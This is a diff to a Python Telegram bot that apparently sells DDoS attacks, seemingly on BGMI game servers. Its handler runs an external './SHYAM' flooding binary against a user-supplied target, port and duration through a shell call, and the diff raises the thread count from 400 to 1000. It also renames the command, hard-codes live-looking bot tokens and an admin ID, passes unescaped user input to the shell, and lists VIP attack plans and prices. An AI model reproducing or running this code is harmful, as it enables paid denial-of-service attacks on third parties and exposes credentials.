@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # insert your Telegram bot tokSasen here
-bot = telebot.TeleBot('7289992579:AAHIXcVEzHAMTFOOPxSZfTOxRfNHcojzRr0')
+bot = telebot.TeleBot('7622556470:AAGfiwEMlvWB3dnXcZdISOCOGHPmu99CeeU')
 
 # Admin user IDs
 admin_id = ["6135948216"]
@@ -242,14 +242,14 @@ def handle_bgmi(message):
             if time > 300:
                 response = "Error: Time interval must be less than 120."
             else:
-                record_command_logs(user_id, '/bgmi', target, port, time)
+                record_command_logs(user_id, '/ultra', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./SHYAM {target} {port} {time} 400"
+                full_command = f"./SHYAM {target} {port} {time} 1000"
                 subprocess.run(full_command, shell=True)
-                response = f"ULTRA 🚀\nAttack1 Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/ULTRA_GAMER_OP"
+                response = f"ULTRA 🚀\nultra Finished. \n📡 Target: {target} \n🔌 Port: {port} \n⏱️ Time: {time} \n BY https://t.me/ULTRA_GAMER_OP"
         else:
-            response = "Usage :- /attack1 <target> <port> <time>\nBy https://t.me/ULTRA_GAMER_OP"  # Updated command syntax
+            response = "Usage :- /ultra <target> <port> <time>\nBy https://t.me/ULTRA_GAMER_OP"  # Updated command syntax
     else:
         response = "You Are Not User's To Authorized To Use This Command.\nBy STORM BOT DM TO GET ACCESS @ULTRA_GAMER_OP"
 
@@ -325,7 +325,6 @@ def welcome_plan(message):
 
 Vip :
 -> Attack Time : 200 (S)
-> After Attack Limit : 2 Min
 -> Concurrents Attack : 300
 
 Pr-ice List:
